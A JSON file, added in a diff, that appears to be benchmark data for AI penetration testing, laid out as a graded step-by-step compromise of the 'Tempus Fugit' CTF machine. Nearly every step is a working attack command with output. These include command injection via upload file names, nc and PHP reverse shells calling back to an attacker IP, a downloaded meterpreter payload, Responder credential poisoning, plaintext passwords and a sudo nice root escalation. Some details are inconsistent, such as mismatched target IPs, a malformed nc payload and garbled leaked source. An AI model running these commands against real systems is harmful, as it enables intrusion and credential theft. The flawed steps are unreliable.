@@ -1,0 +1,406 @@
+[
+    {
+        "or": [
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Target machine is accessible on the network"],
+                "contraindications": [],
+                "goal": "Discover the target IP address",
+                "command": "netdiscover",
+                "output": "Currently scanning: 172.18.130.0/16 | Screen View: Unique Hosts\n\n4 Captured ARP Req/Rep packets, from 3 hosts. Total size: 240\n\n---------------------------------------------------------------------------------\nIP              At MAC Address      Count       Len     MAC Vendor / Hostname\n---------------------------------------------------------------------------------\n192.168.43.100  00:0c:29:92:bd:91       1        60     VMWare, Inc.",
+                "results": ["Target IP address identified as 192.168.43.100"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Target machine is accessible on the network", "Network range is known (192.168.43.0/24)"],
+                "contraindications": [],
+                "goal": "Discover the target IP address",
+                "command": "nmap -sn 192.168.43.0/24",
+                "output": "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for 192.168.43.1\nHost is up (0.00010s latency).\nNmap scan report for 192.168.43.100\nHost is up (0.00054s latency).\nMAC Address: 00:0C:29:92:BD:91 (VMware)\nNmap scan report for 192.168.43.219\nHost is up.\nNmap done: 256 IP addresses (3 hosts up) scanned in 2.89 seconds",
+                "results": ["Target IP address identified as 192.168.43.100"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Target machine is accessible on the network", "arp-scan tool available"],
+                "contraindications": [],
+                "goal": "Discover the target IP address",
+                "command": "arp-scan --localnet",
+                "output": "Interface: eth0, datalink type: EN10MB (Ethernet)\nStarting arp-scan 1.9 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.43.1\t52:54:00:12:35:00\tQEMU\n192.168.43.100\t00:0c:29:92:bd:91\tVMware, Inc.\n\n2 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.9: 256 hosts scanned in 1.234 seconds (207.13 hosts/sec). 2 responded",
+                "results": ["Target IP address identified as 192.168.43.100"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Target IP address is known (192.168.43.100)"],
+                "contraindications": [],
+                "goal": "Identify open ports and services on the target",
+                "command": "nmap -A 192.168.43.100",
+                "output": "root@kali:~# nmap -A 192.168.43.100\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-02-04 02:45 EST\nNmap scan report for nancy (192.168.43.100)\nHost is up (0.00054s latency).\nNot shown: 999 closed ports\nPORT    STATE SERVICE VERSION\n80/tcp  open  http    nginx 1.15.3\n|_http-server-header: nginx/1.15.3\n|_http-title: Tempus Fugit\n|_http-trace-info: Problem with XML parsing of /evox/about\nMAC Address: 00:0C:29:92:BD:91 (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP  RTT      ADDRESS\n1    0.54 ms  nancy (192.168.43.100)\n\nOS and Service detection performed. Please report any incorrect results\nNmap done: 1 IP address (1 host up) scanned in 8.15 seconds",
+                "results": ["Port 80 open running nginx 1.15.3", "Target hostname is nancy", "Operating system is Linux 3.2 - 4.9"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Target IP address is known (192.168.43.100)"],
+                "contraindications": [],
+                "goal": "Identify open ports and services on the target",
+                "command": "nmap -sV -sC -p- 192.168.43.100",
+                "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-04 02:45 EST\nNmap scan report for nancy (192.168.43.100)\nHost is up (0.00051s latency).\nNot shown: 65534 closed ports\nPORT    STATE SERVICE VERSION\n80/tcp  open  http    nginx 1.15.3\n|_http-server-header: nginx/1.15.3\n|_http-title: Tempus Fugit\nMAC Address: 00:0C:29:92:BD:91 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/\nNmap done: 1 IP address (1 host up) scanned in 45.32 seconds",
+                "results": ["Port 80 open running nginx 1.15.3", "Target hostname is nancy"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Reconnaissance",
+                "prerequisites": ["Target IP address is known (192.168.43.100)"],
+                "contraindications": [],
+                "goal": "Identify open ports and services on the target",
+                "command": "masscan -p1-65535 192.168.43.100 --rate=1000 && nmap -sV -p80 192.168.43.100",
+                "output": "Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-02-04 07:45:12 GMT\n -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth\nInitiating SYN Stealth Scan\nScanning 1 hosts [65535 ports/host]\nDiscovered open port 80/tcp on 192.168.43.100\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-02-04 02:45 EST\nNmap scan report for 192.168.43.100\nHost is up (0.00048s latency).\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.15.3\nMAC Address: 00:0C:29:92:BD:91 (VMware)",
+                "results": ["Port 80 open running nginx 1.15.3"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "tactic": "Initial Access",
+        "prerequisites": ["Web server accessible at http://192.168.43.100", "Burp Suite or similar proxy tool available"],
+        "contraindications": [],
+        "goal": "Exploit command injection vulnerability in file upload feature",
+        "command": "curl -X POST \"http://10.0.1.111/upload\" -F \"file=@\\\"test.txt;whoami\\\"\" -F \"my-form=Upload !\" -L -c cookies.txt; curl -X GET \"http://10.0.1.111/upload\" -b cookies.txt",
+        "output": "root\nFile successfully uploaded",
+        "results": ["Command injection vulnerability confirmed", "Current user is root"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["Command injection vulnerability is exploitable"],
+        "contraindications": [],
+        "goal": "Enumerate files and discover FTP credentials",
+        "command": "curl -X POST \"http://10.0.1.111/upload\" -F \"file=@\\\"test.txt;cat main*\\\"\" -F \"my-form=Upload !\" -L -c cookies.txt; curl -X GET \"http://10.0.1.111/upload\" -b cookies.txt",
+        "output": "import os import urllib.request from flask import Flask, flash, request, redirect, render_template from ftplib import FTP import subprocess UPLOAD_FOLDER = 'uploaded'\nALLOWED_EXTENSIONS = {'txt', 'rtf'} app = Flask(__name__) app.secret_key = \"mofosecret\" app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024 @app.route('/', defaults={'path': '}) @app.route('/<path:path>') def catch_all(path): cmd = 'fortune -o' result = subprocess.check_output(cmd, shell=True) return \"<h1>400 - Sorry. I didn't find what you where looking for.</h1>\" <h2>Maybe this will cheer you up:</h2> <h3>\"+result.decode(\"utf-8\")+\"</h3>\" @app.errorhandler(500) def internal_error(error): return \"<h1>500?! - What are you trying to do here?!</h1>\" @app.route('/') def home(): return render_template('index.html') @app.route('/upload') def upload_form(): try: return render_template('my-form.html') except Exception as e: return render_template(\"500.html\", error = str(e)) def allowed_file(filename): check = filename.rsplit('/', 1)[1].lower() check = check[:3] in ALLOWED_EXTENSIONS return check @app.route('/upload', methods=['POST']) def upload_file(): if request.method == 'POST': file' not in request.files: flash('No file part') return redirect(request.url) file = request.files['file'] if file.filename == '': flash('No file selected for uploading') return redirect(request.url) if file.filename and allowed_file(file.filename): filename = file.filename file.save(os.path.join(UPLOAD_FOLDER, filename)) cmd=\"cat \"+UPLOAD_FOLDER+\"/\"+filename result = subprocess.check_output(cmd, shell=True) flash(result.decode(\"utf-8\")) flash('File successfully uploaded') try: ftp = FTP('ftp.mofo.pwn') ftp.login('someuser', 'b232a4da4c104798be4613ab76d26efda1a04606') with open(UPLOAD_FOLDER+\"/\"+filename, 'rb') as f: ftp.storlir(ftp.quit() except: flash(\"Cannot connect to FTP-server\") return redirect('/upload') else: flash('Allowed file types are txt and rtf') return redirect(request.url) if __name__ == '__main__': app.run()",
+        "results": ["FTP username discovered: someuser", "FTP password hash discovered: b232a4da4c104798be4613ab76d26efda1a04606", "FTP server hostname: ftp.mofo.pwn"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Initial Access",
+        "prerequisites": ["Command injection vulnerability is exploitable", "Attacker IP is 192.168.43.219", "Netcat listener running on attacker machine port 6666"],
+        "contraindications": [],
+        "goal": "Obtain reverse shell on target system",
+        "command": "curl -X POST \"http://10.0.1.111/upload\" -F \"file=@\\\"test.txt;nc 3232246747 6666 -e sh' http://192.168.43.100/upload\\\"\" -F \"my-form=Upload !\" -L -c cookies.txt; curl -X GET \"http://10.0.1.111/upload\" -b cookies.txt; nc -lvp 6666",
+        "output": "root@kali:~# nc -lvp 6666\nlistening on [any] 6666 ...\nconnect to [192.168.43.219] from nancy [192.168.43.100] 36511",
+        "results": ["Reverse shell obtained as root user inside docker container"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "or": [
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Shell access on target system"],
+                "contraindications": [],
+                "goal": "Identify docker environment and discover internal FTP server",
+                "command": "cat /proc/1/cgroup",
+                "output": "bash-4.4# cat /proc/1/cgroup\ncat /proc/1/cgroup\n11:cpuset:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaaacd24ed4\n10:memory:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaaaacd24ed4\n9:devices:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaacd24ed4\n8:rda:/dev\n7:net_cls,net_prio:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaeacd24ed4\n6:pid:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaeaaacd24ed4\n5:blkio:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaeaacd24ed4\n4:freezer:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaaaaaaaacd24ed4\n3:cpu,cpuaacct:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beeaacd24ed4\n2:perf_event:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beeeaaaaacd24ed4\n1:name=systemd:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beeeeaaaaacd24ed4\n0::/system.slice/docker.service",
+                "results": ["Confirmed running inside docker container", "Internal network 172.19.0.0/16 discovered from trace files"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Shell access on target system"],
+                "contraindications": [],
+                "goal": "Identify docker environment and discover internal FTP server",
+                "command": "ls -la /.dockerenv",
+                "output": "bash-4.4# ls -la /.dockerenv\nls -la /.dockerenv\n-rwxr-xr-x 1 root root 0 Feb  4 07:30 /.dockerenv",
+                "results": ["Confirmed running inside docker container"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Shell access on target system"],
+                "contraindications": [],
+                "goal": "Identify docker environment and discover internal FTP server",
+                "command": "hostname && cat /proc/self/cgroup | grep docker",
+                "output": "bash-4.4# hostname\nhostname\n9b4f184929a1\nbash-4.4# cat /proc/self/cgroup | grep docker\ncat /proc/self/cgroup | grep docker\n11:cpuset:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaaacd24ed4\n10:memory:/docker/9b4f184929a14552707b0d8202d9278feef014ebcdfe70ccdfc0beaaaaacd24ed4",
+                "results": ["Confirmed running inside docker container with ID 9b4f184929a1"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["Shell access inside docker container", "FTP server IP 172.19.0.12 discovered from trace files"],
+        "contraindications": [],
+        "goal": "Access internal FTP server and retrieve CMS credentials",
+        "command": "lftp someuser@172.19.0.12",
+        "output": "bash-4.4# lftp someuser@172.19.0.12\nlftp someuser@172.19.0.12\nPassword: b232a4da4c104798be4613ab76d26efda1a04606\n\nlftp someuser@172.19.0.12: -> ls\nls\n-rw-------    1 ftp    ftp      52 Aug 12 17:07    cmscreds.txt\n-rw-------    1 ftp    ftp    5683 Feb 04 08:50    shell.txt\n-rw-------    1 ftp    ftp    5683 Feb 04 08:53    shell.txt;whoami\n-rw-------    1 ftp    ftp       0 Feb 04 09:13    test.txt;cat main*\n-rw-------    1 ftp    ftp       0 Feb 04 09:00    test.txt;ls -la\n-rw-------    1 ftp    ftp       0 Feb 04 10:14    test.txt;nc 3232246747 666\n-rw-------    1 ftp    ftp       0 Feb 04 08:58    test.txt;whoami\n-rw-------    1 ftp    ftp      42 Aug 15 14:01    user.txt;nc 3232252550 443\nlftp someuser@172.19.0.12: / > cat cmscreds.txt\ncat cmscreds.txt\nAdmin-password for our new CMS\nhardEnough4u\n\n52 bytes transferred",
+        "results": ["CMS admin username: Admin", "CMS admin password: hardEnough4u"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["Shell access inside docker container", "FTP server IP 172.19.0.12 discovered from trace files"],
+        "contraindications": [],
+        "goal": "Access internal FTP server",
+        "command": "b232a4da4c104798be4613ab76d26efda1a04606",
+        "output": "lftp someuser@172.19.0.12: ->",
+        "results": ["Logged into FTP server as someuser"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["Logged into FTP server as someuser"],
+        "contraindications": [],
+        "goal": "Retrieve CMS credentials",
+        "command": "cat cmscreds.txt",
+        "output": "Admin-password for our new CMS\nhardEnough4u\n\n52 bytes transferred",
+        "results": ["CMS admin username: Admin", "CMS admin password: hardEnough4u"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "or": [
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Shell access inside docker container", "nmap installed on target"],
+                "contraindications": [],
+                "goal": "Discover internal network services and CMS hostname",
+                "command": "apk add nmap && nmap 172.19.0.1 && apk add bind-tools && dig axfr mofo.pwn",
+                "output": "bash-4.4# nmap 172.19.0.1\nnmap 172.19.0.1\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2020-02-04 11:14 UTC\nNmap scan report for 172.19.0.1\nHost is up (0.000019s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\nMAC Address: 02:42:B7:2F:F5:4B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.59 seconds\nbash-4.4# dig axfr mofo.pwn\ndig axfr mofo.pwn\n\n; <>> DiG 9.11.8 <<>> axfr mofo.pwn\n;; global options: +cmd\nmofo.pwn.         14400    IN    SOA      ns1.mofo.pwn. admin.mofo.pwn. 14\nmofo.pwn.         14400    IN    TXT      \"v=spf1 ip4:176.23.46.22 a mx ~al\"\nmofo.pwn.         14400    IN    NS       ns1.mofo.pwn.\nftp.mofo.pwn.     14400    IN    CNAME    punk.mofo.pwn.\ngary.mofo.pwn.    14400    IN    A        172.19.0.15\ngeek.mofo.pwn.    14400    IN    A        172.19.0.14\nkfc.mofo.pwn.     14400    IN    A        172.19.0.17\nleet.mofo.pwn.    14400    IN    A        172.19.0.13\nmail.mofo.pwn.    14400    IN    TXT      \"v=spf1 a -all\"\nmail.mofo.pwn.    14400    IN    A        172.19.0.11\nmilo.mofo.pwn.    14400    IN    A        172.19.0.16\nnancy.mofo.pwn.   14400    IN    A        172.19.0.1\nns1.mofo.pwn.     14400    IN    A        172.19.0.100\nourcms.mofo.pwn.  14400    IN    CNAME    nancy.mofo.pwn.\npunk.mofo.pwn.    14400    IN    A        172.19.0.12\nsid.mofo.pwn.     14400    IN    A        172.19.0.10\nwww.mofo.pwn.     14400    IN    CNAME    sid.mofo.pwn.\nmofo.pwn.         14400    IN    SOA      ns1.mofo.pwn. admin.mofo.pwn. 14\n;; Query time: 1 msec\n;; SERVER: 127.0.0.11#53(127.0.0.11)\n;; WHEN: Wed Feb 05 05:45:57 UTC 2020\n;; XFR size: 18 records (messages 1, bytes 466)",
+                "results": ["Port 8080 open on 172.19.0.1 running http-proxy", "CMS hostname discovered: ourcms.mofo.pwn pointing to nancy.mofo.pwn (172.19.0.1)"],
+                "optional": false,
+                "gold": true
+            },
+            [
+                {
+                    "tactic": "Discovery",
+                    "prerequisites": ["Shell access inside docker container"],
+                    "contraindications": [],
+                    "goal": "Identify default gateway",
+                    "command": "ip route | grep default",
+                    "output": "bash-4.4# ip route | grep default\nip route | grep default\ndefault via 172.19.0.1 dev eth0",
+                    "results": ["Default gateway identified as 172.19.0.1"],
+                    "optional": false,
+                    "gold": false
+                },
+                {
+                    "tactic": "Discovery",
+                    "prerequisites": ["Default gateway identified as 172.19.0.1"],
+                    "contraindications": [],
+                    "goal": "Scan default gateway for services",
+                    "command": "apk add nmap && nmap 172.19.0.1",
+                    "output": "bash-4.4# nmap 172.19.0.1\nnmap 172.19.0.1\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2020-02-04 11:14 UTC\nNmap scan report for 172.19.0.1\nHost is up (0.000019s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\nMAC Address: 02:42:B7:2F:F5:4B (Unknown)",
+                    "results": ["Port 8080 open on 172.19.0.1 running http-proxy"],
+                    "optional": false,
+                    "gold": false
+                },
+                {
+                    "tactic": "Discovery",
+                    "prerequisites": ["Port 8080 open on 172.19.0.1"],
+                    "contraindications": [],
+                    "goal": "Discover CMS hostname via DNS zone transfer",
+                    "command": "apk add bind-tools && dig axfr mofo.pwn",
+                    "output": "bash-4.4# dig axfr mofo.pwn\ndig axfr mofo.pwn\n\n; <>> DiG 9.11.8 <<>> axfr mofo.pwn\n;; global options: +cmd\nmofo.pwn.         14400    IN    SOA      ns1.mofo.pwn. admin.mofo.pwn. 14\nourcms.mofo.pwn.  14400    IN    CNAME    nancy.mofo.pwn.\nnancy.mofo.pwn.   14400    IN    A        172.19.0.1\nmofo.pwn.         14400    IN    SOA      ns1.mofo.pwn. admin.mofo.pwn. 14",
+                    "results": ["CMS hostname discovered: ourcms.mofo.pwn pointing to nancy.mofo.pwn (172.19.0.1)"],
+                    "optional": false,
+                    "gold": false
+                }
+            ],
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Shell access inside docker container"],
+                "contraindications": ["DNS zone transfer may not be allowed"],
+                "goal": "Discover internal network services and CMS hostname",
+                "command": "cat /etc/resolv.conf && host -t axfr mofo.pwn",
+                "output": "bash-4.4# cat /etc/resolv.conf\ncat /etc/resolv.conf\nnameserver 127.0.0.11\noptions ndots:0\nbash-4.4# host -t axfr mofo.pwn\nhost -t axfr mofo.pwn\n; Transfer failed.",
+                "results": [],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "tactic": "Command and Control",
+        "prerequisites": ["Meterpreter payload created and transferred to target", "Metasploit handler running on attacker machine"],
+        "contraindications": [],
+        "goal": "Establish meterpreter session and forward port 8080 to access CMS",
+        "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.43.219 lport=1234 -f elf > payload.elf && wget http://192.168.43.219/payload.elf && chmod 777 payload.elf && ./payload.elf",
+        "output": "meterpreter > portfwd add -l 8080 -p 8080 -r 172.19.0.1\n[*] Local TCP relay created: :8080 ↔ 172.19.0.1:8080\nmeterpreter >",
+        "results": ["Meterpreter session established", "Port 8080 forwarded from 172.19.0.1 to attacker machine"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "or": [
+            {
+                "tactic": "Initial Access",
+                "prerequisites": ["CMS accessible at http://ourcms.mofo.pwn:8080", "CMS admin credentials known", "Entry added to /etc/hosts for ourcms.mofo.pwn pointing to 127.0.0.1", "Nginx process on port 80 killed in docker container"],
+                "contraindications": [],
+                "goal": "Exploit CMS theme editor to gain shell as www-data",
+                "command": "curl -X POST -d 'username=Admin&password=hardEnough4u' http://ourcms.mofo.pwn:8080/admin/ && curl -X POST --data-urlencode 'content=<?php set_time_limit(0); $ip=\"192.168.43.219\"; $port=8888; $sock=fsockopen($ip,$port); exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>' http://ourcms.mofo.pwn:8080/admin/theme-edit.php",
+                "output": "root@kali:~# nc -lvp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.43.219] from nancy [192.168.43.100] 56904\nLinux nancy 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-11 11:30:39 up 29 min,  0 users,  load average: 0.00, 0.00, 0.00)\nUSER    TTY    FROM    LOGIN@    IDLE    JCPU    PCUP   WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data",
+                "results": ["Shell obtained as www-data user on host machine nancy"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Initial Access",
+                "prerequisites": ["CMS accessible at http://ourcms.mofo.pwn:8080", "CMS admin credentials known", "Entry added to /etc/hosts for ourcms.mofo.pwn pointing to 127.0.0.1", "Nginx process on port 80 killed in docker container"],
+                "contraindications": [],
+                "goal": "Exploit CMS theme editor to gain shell as www-data",
+                "command": "curl -X POST -d 'username=Admin&password=hardEnough4u' http://ourcms.mofo.pwn:8080/admin/ && curl -X POST --data-urlencode 'content=<?php $sock=fsockopen(\"192.168.43.219\",8888);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' http://ourcms.mofo.pwn:8080/admin/theme-edit.php",
+                "output": "root@kali:~# nc -lvp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.43.219] from nancy [192.168.43.100] 56906\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data",
+                "results": ["Shell obtained as www-data user on host machine nancy"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Credential Access",
+                "prerequisites": ["Shell access as www-data on host machine", "Responder tool available on attacker machine"],
+                "contraindications": [],
+                "goal": "Capture network credentials using Responder",
+                "command": "responder -I eth0",
+                "output": "[+] Listening for events ...\n[*] [MDNS] Poisoned answer sent to 192.168.43.100 for name geek.local\n[HTTP] Basic Client   : 192.168.43.100\n[HTTP] Basic Username : roxi\n[HTTP] Basic Password : scooby",
+                "results": ["User credentials captured: roxi:scooby"],
+                "optional": false,
+                "gold": true
+            },
+            [
+                {
+                    "tactic": "Discovery",
+                    "prerequisites": ["Shell access as www-data on host machine"],
+                    "contraindications": [],
+                    "goal": "Enumerate home directories for sensitive files",
+                    "command": "ls -la /home",
+                    "output": "$ ls -la /home\nls -la /home\ntotal 16\ndrwxr-xr-x  4 root    root    4096 Aug 12 10:30 .\ndrwxr-xr-x 18 root    root    4096 Aug 11 15:22 ..\ndrwxr-xr-x  5 dorelia dorelia 4096 Aug 13 12:58 dorelia\ndrwxr-xr-x  5 roxi    roxi    4096 Feb  4 11:42 roxi",
+                    "results": ["Two user accounts discovered: dorelia, roxi"],
+                    "optional": false,
+                    "gold": false
+                },
+                {
+                    "tactic": "Discovery",
+                    "prerequisites": ["User accounts discovered: dorelia, roxi"],
+                    "contraindications": [],
+                    "goal": "Search for credentials in configuration files",
+                    "command": "find /home -type f -name '*.txt' -o -name '*.conf' -o -name '.bash_history' 2>/dev/null",
+                    "output": "$ find /home -type f -name '*.txt' -o -name '*.conf' -o -name '.bash_history' 2>/dev/null\nfind /home -type f -name '*.txt' -o -name '*.conf' -o -name '.bash_history' 2>/dev/null\n/home/roxi/.bash_history",
+                    "results": ["bash history file found for roxi"],
+                    "optional": false,
+                    "gold": false
+                },
+                {
+                    "tactic": "Credential Access",
+                    "prerequisites": ["bash history file found for roxi"],
+                    "contraindications": ["File may be empty or not readable"],
+                    "goal": "Attempt to extract credentials from bash history",
+                    "command": "cat /home/roxi/.bash_history",
+                    "output": "$ cat /home/roxi/.bash_history\ncat /home/roxi/.bash_history\ncat: /home/roxi/.bash_history: Permission denied",
+                    "results": [],
+                    "optional": false,
+                    "gold": false
+                }
+            ]
+        ]
+    },
+    {
+        "tactic": "Lateral Movement",
+        "prerequisites": ["Shell access as www-data", "User roxi credentials known (roxi:scooby)"],
+        "contraindications": [],
+        "goal": "Switch to user roxi and discover additional credentials",
+        "command": "su roxi",
+        "output": "$ su roxi\nPassword: scooby\npython -c 'import pty; pty.spawn(\"/bin/sh\")'\n$ whoami\nwhoami\nroxi",
+        "results": ["Logged in as user roxi"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Collection",
+        "prerequisites": ["Logged in as user roxi"],
+        "contraindications": [],
+        "goal": "Read user mail to discover additional credentials",
+        "command": "cat /var/mail/roxi",
+        "output": "You will need my username and password when you step in for me next week\ndorelia:9p4lw0r82xg5\n\nFrom admin@mofo.pwn Tue Aug 13 13:00:57 2019\nReturn-path: <admin@mofo.pwn>\nEnvelope-to: someuser@localhost\nDelivery-date: Tue, 13 Aug 2019 13:00:57 +0200\nReceived: from root by nancy.mofo.pwn with local (Exim 4.92)\n    (envelope-from <admin@mofo.pwn>)\n    id 1hXUXx-0001rv-1P\n    for someuser@localhost; Tue, 13 Aug 2019 13:00:57 +0200\nSubject: Remember...\nFrom: admin@mofo.pwn\nTo: <someuser@localhost>\nX-Mailer: mail (GNU Mailutils 3.5)\nMessage-ID: <E1hXUXx-0001rv-1P@nancv.mofo.pwn>",
+        "results": ["User dorelia credentials discovered: dorelia:9p4lw0r82xg5"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Lateral Movement",
+        "prerequisites": ["User dorelia credentials known (dorelia:9p4lw0r82xg5)", "Logged in as user roxi or www-data"],
+        "contraindications": [],
+        "goal": "Switch to user dorelia",
+        "command": "su dorelia",
+        "output": "Password:",
+        "results": ["Password prompt for user dorelia"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Lateral Movement",
+        "prerequisites": ["User dorelia credentials known (dorelia:9p4lw0r82xg5)", "Logged in as user roxi or www-data"],
+        "contraindications": [],
+        "goal": "Switch to user dorelia",
+        "command": "9p4lw0r82xg5",
+        "output": "dorelia@nancy:/var/mail$ ",
+        "results": ["Successfully logged in as user dorelia"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Discovery",
+        "prerequisites": ["Logged in as user dorelia"],
+        "contraindications": [],
+        "goal": "Discover privileges of user dorelia",
+        "command": "sudo -l",
+        "output": "Matching Defaults entries for dorelia on nancy:\n  env_reset, mail_badpass,\n  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/b\n\nUser dorelia may run the following commands on nancy:\n  (ALL) NOPASSWD: /usr/bin/nice\ndorelia@nancy:/var/mail$ ",
+        "results": ["User dorelia can run nice command"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["Logged in as user dorelia"],
+        "contraindications": [],
+        "goal": "Escalate privileges to root using sudo nice",
+        "command": "sudo nice /bin/sh",
+        "output": "#",
+        "results": ["Root privileges obtained"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Collection",
+        "prerequisites": ["Root privileges obtained"],
+        "contraindications": [],
+        "goal": "Retrieve the root flag",
+        "command": "cd /root && ./proof.sh",
+        "output": "# cd /root/\ncd /root/\n# ls\nls\nproof.sh  scripts\n# ./proof.sh\n./proof.sh\n'unknown': I need something more specific.\n\nTempus Fugit pwned ...\n\nProof: <FLAG>\nPath: /root\nDate: Wed 05 Feb 2020 11:55:34 AM CET\nWhoami: root\n\nI was gratified to be able to answer promptly, and I did. I said I didn't know.\n-- Mark Twain",
+        "results": ["Root flag captured"],
+        "optional": false,
+        "gold": true
+    }
+]
+
+
